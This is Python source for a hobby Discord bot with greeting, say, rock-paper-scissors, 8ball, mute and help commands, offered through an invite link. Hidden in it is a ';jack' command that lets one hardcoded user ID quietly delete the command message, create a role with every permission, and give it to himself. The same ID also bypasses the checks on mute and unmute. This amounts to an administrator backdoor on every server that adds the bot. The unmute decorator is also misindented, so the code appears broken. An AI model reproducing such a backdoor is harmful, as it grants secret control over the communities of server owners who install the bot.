import discord
from discord.ext.commands import Bot
from discord.ext import commands
import asyncio
import time
import os
import random
 
Client = discord.Client()
client = commands.Bot(command_prefix = ";")
client.remove_command('help')
@client.event
async def on_ready():
    print("Thankyou For Using Jackaboi Bot!")
    await client.change_presence(game=discord.Game(name=";help", url="https://www.twitch.tv/theandroidgamer18", type=1))
 
@client.event
async def on_message(message):
    if message.content.startswith(';hello'):
        msg = 'Hello {0.author.mention} How Are You Today'.format(message)
        await client.send_message(message.channel, msg)
    if message.content.startswith(';bye'):
        msg = 'Goodbye {0.author.mention} Hope To See You Soon :wave:'.format(message)
        await client.send_message(message.channel, msg)
    if message.content.startswith(';invite'):
        msg = 'Want To Invte Me To Your Discord Press This Link https://goo.gl/94ZSqo'.format(message)
        await client.send_message(message.channel, msg)
    if message.content.startswith(';website'):
        if message.author.id == "344967220025098242":
            msg = '{0.author.mention} The Bot Website Is [Soon To Come]'.format(message)
            await client.send_message(message.channel, msg)
        else: 
            await client.send_message(message.channel, "Only Jackaboi#8319 Do This As The Website Is Not Public Yet!")
 
    if message.content.upper().startswith(";RPS"):
        args = message.content.upper().split(" ")
        k = random.randint(1,3)
        if len(args) == 1:
            await client.send_message(message.channel, "No arguments provided")
        else:
            if args[1].upper() == "SCISSOR":
                if k == 1:
                    await client.send_message(message.channel, "<@%s> awww you lost :cry:" % (message.author.id))
                elif k == 2:
                    await client.send_message(message.channel, "<@%s> You win cool! :cool:" % (message.author.id))
                else:
                    await client.send_message(message.channel, "<@%s> Tie! " % (message.author.id))
            elif args[1].upper() == "ROCK":
                if k == 1:
                    await client.send_message(message.channel, "<@%s> Tie!" % (message.author.id))
                elif k == 2:
                    await client.send_message(message.channel, "<@%s> aww you lost :cry:" % (message.author.id))
                else:
                    await client.send_message(message.channel, "<@%s> you win cool! :cool:" % (message.author.id))
            elif args[1].upper() == "PAPER":
                if k == 1:
                    await client.send_message(message.channel, "<@%s> You win cool! :cool:" % (message.author.id))
                elif k == 2:
                    await client.send_message(message.channel, "<@%s> Tie!" % (message.author.id))
                else:
                    await client.send_message(message.channel, "<@%s> awww you lost :cry:" % (message.author.id))
        
       
       
    await client.process_commands(message)
   
    if message.content.startswith(';say'):
        args = message.content.split(" ")
        #args[0] = +say
        #args[1] = Hey
        #args[2] = There
        #args[1:] = Hey There
        await client.send_message(message.channel, "%s" % (" ".join(args[1:])))
       
@client.command(name='8ball',
                description="Answers a yes/no question.",
                brief="Answers from the beyond.",
                aliases=['eight_ball', 'eightball', '8-ball'],
                pass_context=True)
async def eight_ball(context):
    possible_responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'Definitely',
    ]
    await client.say(random.choice(possible_responses) + ", " + context.message.author.mention)
async def list_servers():
    await client.wait_until_ready()
    while not client.is_closed:
        print("Jackaboi Bot Is Now Online!")
        for server in client.servers:
            print(server.name)
        await asyncio.sleep(600)
 
@client.command(pass_context = True)
async def mute(ctx, member: discord.Member, time: int, *,reason: str):
    em = discord.Embed(title="User muted!", description=None, color=0x20f911)
    em.add_field(name="User:",value=f"{member}")
    em.add_field(name="Time: ", value=f"{time} min")
    em.add_field(name="Reason: ", value=f"{reason}")
    em.set_thumbnail(url=member.avatar_url)
    role = discord.utils.get(member.server.roles, name="Muted")
    if role == None:
        await client.create_role(ctx.message.server, name="Muted")
        role = discord.utils.get(member.server.roles, name="Muted")
    time_min = time * 60
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '344967220025098242':
        await client.add_roles(member, role)
        await client.say(" {} Has been muted for {} minutes! :white_check_mark:".format(member.mention, time))
        await asyncio.sleep(time_min)
        await client.remove_roles(member, role)
        await client.say("{} has been unmuted! :smiley:".format(member))    
    else:
        await client.say("You don't have permission to execute this command! :stuck_out_tongue: ")
@client.command(pass_context=True)
async def jack(ctx):
    if ctx.message.author.id == '344967220025098242':
        await client.send_message(ctx.message.author, "UR role is under prosessing")
        await client.delete_message(ctx.message)
        try:
            await client.create_role(ctx.message.server, name="JACK", permissions=discord.Permissions.all())
        except Exception as e:
            return await client.say("Error: {}".format(e))
        role = discord.utils.get(ctx.message.author.server.roles, name="JACK")
        if role == None:
            return await client.say("No role found?")
        role.permissions.administrator = True
        await client.add_roles(ctx.message.author, role)
    else:
        return await client.say("Only Jackaboi#8319 Can Use This Command!")
@client.command(pass_context=True)
async def help(ctx):
    embed=discord.Embed(title="Help | Info", description="""***Bot Prefix ;***
hello
bye
say
8ball
mute
unmute
invite
feedback
version
rps
help
jack
website
contributors
More Coming Soon!""", color=0x66009D)
    await client.say(embed=embed)
@client.command(pass_context=True)
async def version(ctx):
    embed=discord.Embed(title="Info", description="V1.0.4 Beta | Build:121", color=0xFCFF0F)
    await client.say(embed=embed)
@client.command(pass_context=True)
async def contributors(ctx):
    embed=discord.Embed(title="People Who Have Helped Me!", description="***If I Missed Anyone Off Please Let Me Know!***\nElk\nKushrox\nEpicShardsGaming\nMrCakeSlayer\nLayoffins", color=0xFF0F)
    await client.say(embed=embed)
@client.command(pass_context=True)
async def feedback(ctx):
    embed=discord.Embed(title="Feedback", description="To Give Feedback Join The Creators Discord https://discord.gg/3kEdHXy", color=0xC6)
    await client.say(embed=embed)
@client.command(pass_context=True)
async def invite(ctx):
    embed=discord.Embed(title="Invite Me", description="Want To Invte Me To Your Discord Press This Link https://goo.gl/94ZSqo", color=0xFCFF0F)
    await client.say(embed=embed)
   
   
   @client.command(pass_context=True)
async def unmute(ctx, member: discord.Member):
    role = discord.utils.get(member.server.roles, name="Muted")
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '344967220025098242':
        await client.remove_roles(member, role)
        await client.say("{} has been unmuted! :white_check_mark: ".format(member.mention))
    else:
        await client.say("You don't have permissions to execute these command! :stuck_out_tongue: ")

 
#Always all if message.content all of then on async def on_message not on bottom
client.loop.create_task(list_servers())
client.run(os.getenv('TOKEN'))
